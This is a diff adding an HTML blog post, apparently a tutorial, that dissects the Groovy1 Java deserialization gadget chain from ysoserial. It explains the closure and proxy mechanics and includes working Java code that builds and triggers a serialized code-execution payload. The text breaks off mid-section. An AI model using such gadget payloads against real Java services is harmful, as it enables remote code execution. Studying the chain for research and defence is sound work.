@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>Groovy1 - Java Deserialization Gadget Chain</title>
+    <style>
+        :root {
+            --bg-primary: #1a1a2e;
+            --bg-secondary: #16213e;
+            --bg-code: #0d1117;
+            --text-primary: #e6e6e6;
+            --text-secondary: #b0b0b0;
+            --accent: #e94560;
+            --accent-secondary: #0f3460;
+            --link-color: #58a6ff;
+            --code-keyword: #ff7b72;
+            --code-string: #a5d6ff;
+            --code-comment: #8b949e;
+            --code-type: #79c0ff;
+            --code-method: #d2a8ff;
+            --code-number: #79c0ff;
+            --code-annotation: #ffa657;
+            --code-plain: #c9d1d9;
+            --border-color: #30363d;
+            --highlight-bg: rgba(233, 69, 96, 0.1);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-primary);
+            font-family: 'Segoe UI', Inter, system-ui, -apple-system, BlinkMacSystemFont, Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            font-size: 16px;
+            line-height: 1.7;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 40px 24px 80px;
+        }
+
+        h1 {
+            font-size: 2.4em;
+            font-weight: 700;
+            color: #ffffff;
+            margin-bottom: 8px;
+            border-bottom: 3px solid var(--accent);
+            padding-bottom: 12px;
+        }
+
+        h2 {
+            font-size: 1.6em;
+            font-weight: 600;
+            color: var(--accent);
+            margin-top: 48px;
+            margin-bottom: 16px;
+            padding-bottom: 6px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        h3 {
+            font-size: 1.3em;
+            font-weight: 600;
+            color: #ffa657;
+            margin-top: 32px;
+            margin-bottom: 12px;
+        }
+
+        p {
+            margin-bottom: 14px;
+            color: var(--text-primary);
+        }
+
+        a {
+            color: var(--link-color);
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        b, strong {
+            color: #ffffff;
+            font-weight: 600;
+        }
+
+        i, em {
+            color: #d2a8ff;
+        }
+
+        code {
+            background-color: var(--bg-code);
+            color: var(--code-annotation);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+
+        .codeblock {
+            background-color: var(--bg-code);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px 24px;
+            margin: 16px 0 24px;
+            overflow-x: auto;
+            font-family: 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--code-plain);
+            position: relative;
+            white-space: pre;
+        }
+
+        .codeblock .keyword {
+            color: var(--code-keyword);
+            font-weight: 500;
+        }
+
+        .codeblock .string {
+            color: var(--code-string);
+        }
+
+        .codeblock .comment {
+            color: var(--code-comment);
+            font-style: italic;
+        }
+
+        .codeblock .type {
+            color: var(--code-type);
+        }
+
+        .codeblock .method {
+            color: var(--code-method);
+        }
+
+        .codeblock .annotation {
+            color: var(--code-annotation);
+        }
+
+        .codeblock .number {
+            color: var(--code-number);
+        }
+
+        .chain-block {
+            background-color: var(--bg-code);
+            border-left: 4px solid var(--accent);
+            border-radius: 0 8px 8px 0;
+            padding: 16px 24px;
+            margin: 16px 0 24px;
+            font-family: 'Fira Code', 'Cascadia Code', Consolas, 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.8;
+            color: var(--code-method);
+            white-space: pre;
+        }
+
+        .note {
+            background-color: var(--highlight-bg);
+            border-left: 4px solid var(--accent);
+            padding: 14px 20px;
+            margin: 16px 0;
+            border-radius: 0 6px 6px 0;
+            color: var(--text-secondary);
+        }
+
+        .note strong {
+            color: var(--accent);
+        }
+
+        .image-container {
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .section-divider {
+            border: none;
+            border-top: 1px solid var(--border-color);
+            margin: 40px 0;
+        }
+
+        .tag {
+            display: inline-block;
+            background-color: var(--accent-secondary);
+            color: var(--link-color);
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 0.85em;
+            margin-right: 6px;
+        }
+
+        .subtitle {
+            color: var(--text-secondary);
+            font-size: 1.1em;
+            margin-bottom: 32px;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px 16px 60px;
+            }
+            h1 {
+                font-size: 1.8em;
+            }
+            .codeblock {
+                padding: 14px 16px;
+                font-size: 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+
+        <h1>Groovy1</h1>
+        <p class="subtitle">
+            <span class="tag">Java Deserialization</span>
+            <span class="tag">Groovy</span>
+            <span class="tag">Gadget Chain</span>
+        </p>
+
+        <p>In this blog post we will dissect the Groovy1 Gadget chain.</p>
+        <p>We will analyze the gadget present in ysoserial, how we can modify it to use a different data structure, and how we can achieve SSRF and Arbitrary File Write by targeting different functions in the gadget flow.</p>
+
+        <div class="note">
+            <strong>Prerequisites:</strong> CommonsCollection1 and CommonsCollection2.<br>
+            Please go through these two blogs to have a firm understanding before diving in.
+        </div>
+
+        <p>The gadget flow looks like this:</p>
+
+        <div class="chain-block">ObjectInputStream.readObject()
+    AnnotationInvocationHandler.readObject()
+        Map(Proxy).entrySet()
+            ConvertedClosure.invoke()
+                MethodClosure.call()
+                    ProcessGroovyMethods.execute(String)
+                        Runtime.exec()</div>
+
+        <hr class="section-divider">
+
+        <h2>Understanding Groovy Closures</h2>
+
+        <p>Before diving deep, let's understand a few things about Groovy.</p>
+
+        <p>In Groovy, there is a concept called <b>Closure</b>, MethodClosure, and ConvertedClosure.</p>
+
+        <p>In Groovy, a Closure is a block of code that can be passed around like a variable.
+        For example, if we take MethodClosure:</p>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+
+<span class="keyword">public class</span> <span class="type">a</span> {
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span> args[])
+    {
+
+    <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(<span class="string">"calc.exe"</span>, <span class="string">"execute"</span>);
+    mc.<span class="method">call</span>();
+    }
+
+}</div>
+
+        <p>The code above will execute calc.exe (we will understand how it works shortly, but for now let's keep this in mind).</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image.png" alt="MethodClosure execution">
+        </div>
+
+        <p>A <b>ConvertedClosure</b> is an adapter that makes a Closure <em>look like</em> a Java interface.
+        It helps you intercept method calls and redirect them to another handler.</p>
+
+        <p>So if you wrap your MethodClosure in a ConvertedClosure and invoke it, this will trigger the MethodClosure.</p>
+
+        <p>However, triggering the ConvertedClosure is a little tricky.</p>
+
+        <p>But let's come back to this in a bit. Let's take a look at the gadget code.</p>
+
+        <hr class="section-divider">
+
+        <h2>The Gadget Code (ysoserial)</h2>
+
+        <div class="codeblock"><span class="keyword">public class</span> <span class="type">Groovy1</span> <span class="keyword">extends</span> <span class="type">PayloadRunner</span> <span class="keyword">implements</span> <span class="type">ObjectPayload</span>&lt;<span class="type">InvocationHandler</span>&gt; {
+
+    <span class="keyword">public</span> <span class="type">InvocationHandler</span> <span class="method">getObject</span>(<span class="keyword">final</span> <span class="type">String</span> command) <span class="keyword">throws</span> <span class="type">Exception</span> {
+        <span class="keyword">final</span> <span class="type">ConvertedClosure</span> closure = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(<span class="keyword">new</span> <span class="type">MethodClosure</span>(command, <span class="string">"execute"</span>), <span class="string">"entrySet"</span>); <span class="comment">//[1]</span>
+
+        <span class="keyword">final</span> <span class="type">Map</span> map = <span class="type">Gadgets</span>.<span class="method">createProxy</span>(closure, <span class="type">Map</span>.<span class="keyword">class</span>); <span class="comment">//[2]</span>
+
+        <span class="keyword">final</span> <span class="type">InvocationHandler</span> handler = <span class="type">Gadgets</span>.<span class="method">createMemoizedInvocationHandler</span>(map); <span class="comment">//[3]</span>
+
+        <span class="keyword">return</span> handler;
+    }
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="keyword">final</span> <span class="type">String</span>[] args) <span class="keyword">throws</span> <span class="type">Exception</span> {
+        <span class="type">PayloadRunner</span>.<span class="method">run</span>(<span class="type">Groovy1</span>.<span class="keyword">class</span>, args);
+    }
+}</div>
+
+        <p>The above code at <b>[1]</b> creates a ConvertedClosure that wraps a MethodClosure.</p>
+        <p>Looking at <b>[2]</b>, it creates a dynamic Proxy using the above Closure with Map.class as the interface (remember, a dynamic proxy requires three things: a ClassLoader, an Interface, and a Handler &mdash; here the Closure is the handler).</p>
+
+        <p>But why do we use a Closure as the handler?</p>
+
+        <p><b>ConvertedClosure</b> extends <b>ConversionHandler</b>, which implements <b>InvocationHandler</b>.</p>
+
+        <p>As we know from our previous research, if we create a dynamic proxy and set the handler to an object of a class that implements InvocationHandler, then the invoke() method on that class gets executed.</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (1).png" alt="ConversionHandler invoke">
+        </div>
+
+        <p>In the invoke() method of ConversionHandler.java, if checkMethod() returns false, then invokeCustom() gets called.</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/Screenshot 2026-02-23 192714.png" alt="checkMethod and invokeCustom">
+        </div>
+
+        <p>This further calls invokeCustom() on the ConvertedClosure class.</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (2).png" alt="ConvertedClosure invokeCustom">
+        </div>
+
+        <p>This then calls <code>Closure.call()</code>. Since our Closure is a MethodClosure, we have already seen how MethodClosure.call() works.</p>
+
+        <p>In short, if we can reach the invoke() method of ConversionHandler, we can achieve code execution.</p>
+
+        <p>Now the question is: how do we reach here?</p>
+
+        <p>Whenever you see a class that implements InvocationHandler, the go-to mechanism for reaching invoke() is a <b>Dynamic Proxy</b>.</p>
+
+        <p>We can create a Dynamic Proxy with this Closure as the Handler, and whenever any method is called on the proxy, the invoke() method will be triggered.</p>
+
+        <hr class="section-divider">
+
+        <h2>Building the Exploit with PriorityQueue</h2>
+
+        <p>So let's look at the code below.</p>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">java.lang.reflect.InvocationHandler</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Proxy</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Constructor</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Field</span>;
+<span class="keyword">import</span> <span class="type">java.util.Base64</span>;
+<span class="keyword">import</span> <span class="type">java.util.Comparator</span>;
+<span class="keyword">import</span> <span class="type">java.util.HashMap</span>;
+<span class="keyword">import</span> <span class="type">java.util.Map</span>;
+<span class="keyword">import</span> <span class="type">java.util.PriorityQueue</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayOutputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.File</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectOutputStream</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.ConvertedClosure</span>;
+<span class="keyword">import</span> <span class="type">groovy.lang.Closure</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+<span class="keyword">import</span> <span class="type">java.net.URL</span>;
+
+<span class="keyword">class</span> <span class="type">a</span> {
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span>[] args) {
+        <span class="comment">// Create a simple Closure</span>
+      <span class="keyword">try</span>{
+
+        <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(<span class="string">"notepad.exe"</span>, <span class="string">"execute"</span>);
+
+        <span class="comment">// Wrap it in ConvertedClosure, specifying which method to intercept</span>
+        <span class="type">ConvertedClosure</span> handler = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(mc, <span class="string">"compare"</span>);
+
+            <span class="type">Comparator</span> proxy = (<span class="type">Comparator</span>) <span class="type">Proxy</span>.<span class="method">newProxyInstance</span>(
+            <span class="type">ConvertedClosure</span>.<span class="keyword">class</span>.<span class="method">getClassLoader</span>(),
+            <span class="keyword">new</span> <span class="type">Class</span>&lt;?&gt;[]{ <span class="type">Comparator</span>.<span class="keyword">class</span> },
+            handler
+        );
+
+            <span class="type">PriorityQueue</span>&lt;<span class="type">Object</span>&gt; priorityQueue = <span class="keyword">new</span> <span class="type">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, (<span class="type">Comparator</span>&lt;<span class="type">Object</span>&gt;) proxy);
+            priorityQueue.<span class="method">add</span>(<span class="number">1</span>);
+            priorityQueue.<span class="method">add</span>(<span class="number">2</span>);
+
+
+}<span class="keyword">catch</span>(<span class="type">Exception</span> e)
+{
+    e.<span class="method">printStackTrace</span>();
+}
+       }
+}</div>
+
+        <p>Looking at the above code:</p>
+
+        <p>We create a PriorityQueue and perform an add operation, which triggers compare() on the Comparator we provide. In our case, the Comparator is a Dynamic Proxy with ConvertedClosure as the Handler.</p>
+
+        <p>So theoretically, this should launch notepad.exe. The code flow is:</p>
+
+        <div class="chain-block">PQueue &rarr; Comparator.compare &rarr; DProxy.compare &rarr; Handler.invoke() &rarr; invokeCustom() &rarr; MethodClosure.call</div>
+
+        <p>When we execute it:</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (3).png" alt="MissingMethodException error">
+        </div>
+
+        <p>Looking at the error, it says the method signature was not found for <code>String.execute()</code>, which makes sense &mdash; String.class does not have a method called execute(). So why are we calling it this way, and how was it working previously?</p>
+
+        <hr class="section-divider">
+
+        <h2>How MethodClosure.call() Works</h2>
+
+        <p>In Groovy, the <b>GDK (Groovy Development Kit)</b> is how Groovy adds extra methods to existing Java classes <b>without modifying them</b>. Classes like <code>String</code>, <code>List</code>, <code>File</code>, etc. get new convenient methods that don't exist in standard Java.</p>
+
+        <p><b>How it works:</b> Groovy uses <b>extension methods</b> &mdash; static methods in helper classes that act as if they're instance methods on the target class. At runtime, Groovy's meta-object protocol (MOP) intercepts method calls and routes them to the appropriate helper class.</p>
+
+        <p>In short, in Groovy there are classes like:</p>
+
+        <div class="codeblock"><span class="type">DefaultGroovyMethods</span>
+<span class="type">ProcessGroovyMethods</span>
+<span class="type">StringGroovyMethods</span>
+<span class="type">IOGroovyMethods</span></div>
+
+        <p>These classes provide additional functionality to existing Java classes without modifying them.</p>
+
+        <p>To find out which class and method belongs to which data type, look at <code>org.codehaus.groovy.runtime.DefaultGroovyMethods</code>. Every method here belongs to a certain data type class, adding additional processing capability.</p>
+
+        <p>The first argument of these methods determines which data type they extend.</p>
+
+        <p>For example, if you check <code>withStreams</code> method, the first argument is of Socket type, meaning this functionality is added for Socket-type objects.</p>
+
+        <p>So when we pass "notepad.exe" and "execute" to MethodClosure, it routes to the execute() function for the String type.</p>
+
+        <p>But there are many execute() overloads that take String as the first argument.</p>
+
+        <h3>Function Overloading &amp; the ConvertedClosure</h3>
+
+        <p>This is where function overloading comes into the picture. Let's go back to the ConvertedClosure class and the invokeCustom function.</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (2).png" alt="ConvertedClosure invokeCustom">
+        </div>
+
+        <p><code>((Closure) getDelegate()).call(args)</code> is basically calling <code>MethodClosure.call(args)</code> (since we wrapped MethodClosure in the ConvertedClosure).</p>
+
+        <p>So the above code effectively becomes: <code>MethodClosure.call(1, 1)</code></p>
+
+        <p>The (1, 1) arguments come from PriorityQueue's siftDownUsingComparator() call, which is what we use as the trigger.</p>
+
+        <h3>MethodClosure's doCall()</h3>
+
+        <p>Now let's look at the MethodClosure class. This class has a function called doCall:</p>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (4).png" alt="MethodClosure doCall">
+        </div>
+
+        <p>getOwner() &rarr; "Calc.exe"<br>
+        method = "Execute"<br>
+        arguments = 1, 1</p>
+
+        <h3>InvokerHelper Chain</h3>
+
+        <p>The invokeMethod is present in the InvokerHelper class:</p>
+
+        <div class="codeblock"><span class="keyword">public static</span> <span class="type">Object</span> <span class="method">invokeMethod</span>(<span class="type">Object</span> object, <span class="type">String</span> methodName, <span class="type">Object</span> arguments) {
+    <span class="keyword">if</span> (object == <span class="keyword">null</span>) {
+        object = <span class="type">NullObject</span>.<span class="method">getNullObject</span>();
+    }
+
+    <span class="comment">// if the object is a Class, call a static method from that class</span>
+    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> <span class="type">Class</span>) {
+        <span class="type">Class</span> theClass = (<span class="type">Class</span>) object;
+        <span class="type">MetaClass</span> metaClass = metaRegistry.<span class="method">getMetaClass</span>(theClass);
+        <span class="keyword">return</span> metaClass.<span class="method">invokeStaticMethod</span>(object, methodName, <span class="method">asArray</span>(arguments));
+    }
+
+    <span class="comment">// it's an instance; check if it's a Java one</span>
+    <span class="keyword">if</span> (!(object <span class="keyword">instanceof</span> <span class="type">GroovyObject</span>)) {
+        <span class="keyword">return</span> <span class="method">invokePojoMethod</span>(object, methodName, arguments);
+    }
+
+    <span class="comment">// a groovy instance (including builder, closure, ...)</span>
+    <span class="keyword">return</span> <span class="method">invokePogoMethod</span>(object, methodName, arguments);
+}</div>
+
+        <p>The object is not null, so the first condition fails.</p>
+        <p>"Calc.exe" is not an instance of a Class, so the second condition fails.</p>
+        <p>The third condition checks if this is not a GroovyObject instance &mdash; this check passes, so <code>invokePojoMethod()</code> gets called.</p>
+
+        <div class="codeblock"><span class="keyword">static</span> <span class="type">Object</span> <span class="method">invokePojoMethod</span>(<span class="type">Object</span> object, <span class="type">String</span> methodName, <span class="type">Object</span> arguments) {
+    <span class="type">MetaClass</span> metaClass = <span class="type">InvokerHelper</span>.<span class="method">getMetaClass</span>(object);
+    <span class="keyword">return</span> metaClass.<span class="method">invokeMethod</span>(object, methodName, <span class="method">asArray</span>(arguments));
+}</div>
+
+        <p>This further calls getMetaClass(), which takes an Object as its argument.</p>
+
+        <div class="codeblock"><span class="keyword">public static</span> <span class="type">MetaClass</span> <span class="method">getMetaClass</span>(<span class="type">Object</span> object) {
+    <span class="keyword">if</span> (object <span class="keyword">instanceof</span> <span class="type">GroovyObject</span>)
+        <span class="keyword">return</span> ((<span class="type">GroovyObject</span>) object).<span class="method">getMetaClass</span>();
+    <span class="keyword">else</span>
+        <span class="keyword">return</span> ((<span class="type">MetaClassRegistryImpl</span>) <span class="type">GroovySystem</span>.<span class="method">getMetaClassRegistry</span>()).<span class="method">getMetaClass</span>(object);
+}</div>
+
+        <p>Our object here is "calc.exe", which is not a GroovyObject, so the else block is executed.</p>
+
+        <p>The MetaClassRegistryImpl.getMetaClass:</p>
+
+        <div class="codeblock"><span class="keyword">public</span> <span class="type">MetaClass</span> <span class="method">getMetaClass</span>(<span class="type">Object</span> obj) {
+    <span class="keyword">return</span> <span class="type">ClassInfo</span>.<span class="method">getClassInfo</span>(obj.<span class="method">getClass</span>()).<span class="method">getMetaClass</span>(obj);
+}</div>
+
+        <p>This resolves our entry "calc.exe" to its class type (String.class) and then searches for the relevant MetaClass.</p>
+
+        <p>This searches for GroovyMethods classes that accept String.class. Once found, it returns to invokePojoMethod and calls invokeMethod on MetaClassImpl with "execute" as the method name. Based on our earlier analysis of DefaultGroovyMethods, this leads to <b>ProcessGroovyMethods</b>.</p>
+
+        <p>In ProcessGroovyMethods, there is no execute() overload that accepts 2 extra arguments (as passed by the compare call), which is why we get the error:</p>
+
+        <div class="codeblock"><span class="comment">groovy.lang.MissingMethodException: No signature of method: java.lang.String.execute()
+  is applicable for argument types: (java.lang.Integer, java.lang.Integer) values: [2, 1]</span></div>
+
+        <p>In short, when we use PriorityQueue to reach ConversionHandler's invoke() method, our <code>"calc.exe".execute()</code> becomes <code>ProcessGroovyMethods.execute("calc.exe", 2, 1)</code> and ProcessGroovyMethods has no <code>execute(String, Integer, Integer)</code> signature.</p>
+
+        <p>But in ProcessGroovyMethods, we have:</p>
+
+        <div class="codeblock"><span class="keyword">public static</span> <span class="type">Process</span> <span class="method">execute</span>(<span class="keyword">final</span> <span class="type">String</span> self) <span class="keyword">throws</span> <span class="type">IOException</span> {
+    <span class="keyword">return</span> <span class="type">Runtime</span>.<span class="method">getRuntime</span>().<span class="method">exec</span>(self);
+}</div>
+
+        <p>So if we use an entry point that passes no extra arguments, our call becomes <code>ProcessGroovyMethods.execute("calc.exe")</code>, which leads to code execution.</p>
+
+        <hr class="section-divider">
+
+        <h2>Why Not HashMap?</h2>
+
+        <p>Instead of PriorityQueue, you might think we could use a HashMap, since its methods do not take extra arguments by default &mdash; which might seem to allow code execution.</p>
+
+        <p>However, this would not succeed. Since hashCode is defined in <code>java.lang.Object</code>, checkMethod() on ConversionHandler will return true, and we will never reach <code>MethodClosure.call</code>.</p>
+
+        <hr class="section-divider">
+
+        <h2>AnnotationInvocationHandler</h2>
+
+        <p>The AnnotationInvocationHandler class present in the JDK has a readObject() method that calls entrySet() on the memberValues.</p>
+
+        <div class="codeblock"><span class="keyword">private void</span> <span class="method">readObject</span>(<span class="type">java.io.ObjectInputStream</span> s)
+    <span class="keyword">throws</span> <span class="type">java.io.IOException</span>, <span class="type">ClassNotFoundException</span> {
+    <span class="type">ObjectInputStream.GetField</span> fields = s.<span class="method">readFields</span>();
+
+    <span class="annotation">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)
+    <span class="type">Class</span>&lt;? <span class="keyword">extends</span> <span class="type">Annotation</span>&gt; t = (<span class="type">Class</span>&lt;? <span class="keyword">extends</span> <span class="type">Annotation</span>&gt;)fields.<span class="method">get</span>(<span class="string">"type"</span>, <span class="keyword">null</span>);
+    <span class="annotation">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)
+    <span class="type">Map</span>&lt;<span class="type">String</span>, <span class="type">Object</span>&gt; streamVals = (<span class="type">Map</span>&lt;<span class="type">String</span>, <span class="type">Object</span>&gt;)fields.<span class="method">get</span>(<span class="string">"memberValues"</span>, <span class="keyword">null</span>);
+
+    <span class="type">AnnotationType</span> annotationType = <span class="keyword">null</span>;
+    <span class="keyword">try</span> {
+        annotationType = <span class="type">AnnotationType</span>.<span class="method">getInstance</span>(t);
+    } <span class="keyword">catch</span>(<span class="type">IllegalArgumentException</span> e) {
+        <span class="keyword">throw new</span> <span class="type">java.io.InvalidObjectException</span>(<span class="string">"Non-annotation type in annotation serial stream"</span>);
+    }
+
+    <span class="type">Map</span>&lt;<span class="type">String</span>, <span class="type">Class</span>&lt;?&gt;&gt; memberTypes = annotationType.<span class="method">memberTypes</span>();
+    <span class="type">Map</span>&lt;<span class="type">String</span>, <span class="type">Object</span>&gt; mv = <span class="keyword">new</span> <span class="type">LinkedHashMap</span>&lt;&gt;();
+
+    <span class="keyword">for</span> (<span class="type">Map.Entry</span>&lt;<span class="type">String</span>, <span class="type">Object</span>&gt; memberValue : streamVals.<span class="method">entrySet</span>()) {
+        <span class="type">String</span> name = memberValue.<span class="method">getKey</span>();
+        <span class="type">Object</span> value = <span class="keyword">null</span>;
+        <span class="type">Class</span>&lt;?&gt; memberType = memberTypes.<span class="method">get</span>(name);
+        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) {
+            value = memberValue.<span class="method">getValue</span>();
+            <span class="keyword">if</span> (!(memberType.<span class="method">isInstance</span>(value) ||
+                  value <span class="keyword">instanceof</span> <span class="type">ExceptionProxy</span>)) {
+                value = <span class="keyword">new</span> <span class="type">AnnotationTypeMismatchExceptionProxy</span>(
+                        value.<span class="method">getClass</span>() + <span class="string">"["</span> + value + <span class="string">"]"</span>).<span class="method">setMember</span>(
+                            annotationType.<span class="method">members</span>().<span class="method">get</span>(name));
+            }
+        }
+        mv.<span class="method">put</span>(name, value);
+    }
+
+    <span class="type">UnsafeAccessor</span>.<span class="method">setType</span>(<span class="keyword">this</span>, t);
+    <span class="type">UnsafeAccessor</span>.<span class="method">setMemberValues</span>(<span class="keyword">this</span>, mv);
+}</div>
+
+        <p>This readObject() calls entrySet() on memberValues. The memberValues field is set via the constructor, which we set to our Dynamic Proxy.</p>
+
+        <p>The flow is:</p>
+
+        <div class="chain-block">AnnotationInvocationHandler &rarr; readObject &rarr; DProxy.entrySet
+    &rarr; ConversionHandler.invoke &rarr; invokeCustom
+        &rarr; ConvertedClosure.invokeCustom &rarr; MethodClosure.call
+            &rarr; ProcessGroovyMethods.execute("calc.exe")</div>
+
+        <p>Since entrySet() takes no arguments, the full exploit works.</p>
+
+        <h3>Full Payload Code</h3>
+
+        <div class="codeblock"><span class="keyword">import</span> <span class="type">java.lang.reflect.InvocationHandler</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Proxy</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Constructor</span>;
+<span class="keyword">import</span> <span class="type">java.lang.reflect.Field</span>;
+<span class="keyword">import</span> <span class="type">java.util.Base64</span>;
+<span class="keyword">import</span> <span class="type">java.util.Comparator</span>;
+<span class="keyword">import</span> <span class="type">java.util.HashMap</span>;
+<span class="keyword">import</span> <span class="type">java.util.Map</span>;
+<span class="keyword">import</span> <span class="type">java.util.PriorityQueue</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ByteArrayOutputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.File</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectInputStream</span>;
+<span class="keyword">import</span> <span class="type">java.io.ObjectOutputStream</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.ConvertedClosure</span>;
+<span class="keyword">import</span> <span class="type">groovy.lang.Closure</span>;
+<span class="keyword">import</span> <span class="type">org.codehaus.groovy.runtime.MethodClosure</span>;
+<span class="keyword">import</span> <span class="type">java.net.URL</span>;
+
+<span class="keyword">class</span> <span class="type">exp_hash</span> {
+
+    <span class="keyword">public static void</span> <span class="method">main</span>(<span class="type">String</span>[] args) {
+      <span class="keyword">try</span>{
+         <span class="type">MethodClosure</span> mc = <span class="keyword">new</span> <span class="type">MethodClosure</span>(<span class="string">"notepad.exe"</span>, <span class="string">"execute"</span>);
+
+        <span class="comment">// Wrap it in ConvertedClosure, specifying which method to intercept</span>
+        <span class="type">ConvertedClosure</span> handler = <span class="keyword">new</span> <span class="type">ConvertedClosure</span>(mc, <span class="string">"entrySet"</span>);
+
+        <span class="comment">// Creating the DynamicProxy so that we can reach ConversionHandler.invoke</span>
+            <span class="type">Map</span> proxy = (<span class="type">Map</span>) <span class="type">Proxy</span>.<span class="method">newProxyInstance</span>(
+            <span class="type">ConvertedClosure</span>.<span class="keyword">class</span>.<span class="method">getClassLoader</span>(),
+            <span class="keyword">new</span> <span class="type">Class</span>&lt;?&gt;[]{ <span class="type">Map</span>.<span class="keyword">class</span> },
+            handler
+        );
+
+        <span class="comment">// Initialising the AnnotationInvocationHandler constructor</span>
+        <span class="type">Class</span>&lt;?&gt; aihClass = <span class="type">Class</span>.<span class="method">forName</span>(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);
+        <span class="type">Constructor</span>&lt;?&gt; ctor = aihClass.<span class="method">getDeclaredConstructors</span>()[<span class="number">0</span>];
+        ctor.<span class="method">setAccessible</span>(<span class="keyword">true</span>);
+
+        <span class="type">InvocationHandler</span> aih = (<span class="type">InvocationHandler</span>) ctor.<span class="method">newInstance</span>(
+            <span class="type">Override</span>.<span class="keyword">class</span>,
+            proxy
+        );
+
+        <span class="comment">// Serialize and Deserialize</span>
+        <span class="type">ByteArrayOutputStream</span> bos = <span class="keyword">new</span> <span class="type">ByteArrayOutputStream</span>();
+        <span class="type">ObjectOutputStream</span> oos = <span class="keyword">new</span> <span class="type">ObjectOutputStream</span>(bos);
+        oos.<span class="method">writeObject</span>(aih);
+        oos.<span class="method">close</span>();
+
+        <span class="type">String</span> encoded = <span class="type">Base64</span>.<span class="method">getEncoder</span>().<span class="method">encodeToString</span>(bos.<span class="method">toByteArray</span>());
+        <span class="type">System</span>.out.<span class="method">println</span>(encoded);
+        <span class="keyword">byte</span>[] decoded = <span class="type">Base64</span>.<span class="method">getDecoder</span>().<span class="method">decode</span>(encoded);
+        <span class="type">ByteArrayInputStream</span> bis = <span class="keyword">new</span> <span class="type">ByteArrayInputStream</span>(decoded);
+        <span class="type">ObjectInputStream</span> ois = <span class="keyword">new</span> <span class="type">ObjectInputStream</span>(bis);
+        ois.<span class="method">readObject</span>();
+        ois.<span class="method">close</span>();
+
+}<span class="keyword">catch</span>(<span class="type">Exception</span> e)
+{
+    e.<span class="method">printStackTrace</span>();
+}
+
+    }
+}</div>
+
+        <div class="image-container">
+            <img src="images/groovy1/image (6).png" alt="Successful RCE with AnnotationInvocationHandler">
+        </div>
+
+        <p>So this is how the original Gadget Chain works.</p>
+
+        <hr class="section-divider">
+
+        <h2 style="color: #ffa657;">Extra Miles</h2>
+
+        <p>Let's take a step back and try to use PriorityQueue to execute our system command.</p>
+
+        <p>By now, you should know that every time <code>MethodClosure.call(args)</code> is invoked, it routes to &lt;Something&gt;GroovyMethods.java.</p>
+
+        <p>So when we trigger this from PriorityQueue's compare method, <code>MethodClosure("notepad.exe", "execute")</code> leads to <code>ProcessGroovyMethods.execute("notepad.exe", 2, 1)</code>.</p>
+
+        <p>However, if there exists a function that takes 3 arguments (including self) and executes our input via <code>Runtime.getRuntime().exec()</code>, we can still achieve code execution.</p>
+
+        <h3>RCE via PriorityQueue</h3>
+
+        <p>Checking DefaultGroovyMethods.java:</p>
+
+        <div class="codeblock"><span class="annotation">@Deprecated</span>
